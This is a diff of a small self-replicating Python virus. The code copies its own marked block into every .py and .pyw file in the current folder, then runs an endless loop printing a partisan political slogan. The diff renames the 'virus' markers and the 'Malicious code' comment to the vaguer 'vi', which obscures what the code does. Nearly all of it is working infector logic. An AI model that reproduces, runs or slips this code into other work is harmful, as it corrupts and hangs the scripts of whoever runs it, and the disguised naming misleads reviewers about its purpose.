@@ -1,4 +1,4 @@
-#Start of virus
+#Start of vi
 
 import sys, glob
 
@@ -8,11 +8,11 @@ with open(sys.argv[0], 'r') as f:
 
 virus_area = False
 for line in lines:
-    if line == '#Start of virus\n':
+    if line == '#Start of vi\n':
         virus_area = True
     if virus_area:
         code.append(line)
-    if line == '#End of virus\n':
+    if line == '#End of vi\n':
         break
 
 python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
@@ -23,7 +23,7 @@ for script in python_scripts:
 
     infected = False
     for line in script_code:
-        if line == '#Start of virus\n':
+        if line == '#Start of vi\n':
             infected = True
             break
     if not infected:
@@ -35,12 +35,12 @@ for script in python_scripts:
        with open(script,'w') as f:
             f.writelines(final_code)
 
-#Malicious code/ Virus
+#Vi Code
 
 #maga2020
 while(100==100):
      print("Make America Great Again!\n Biden is a socialist loser")
      
      
-#End of virus
+#End of vi
 
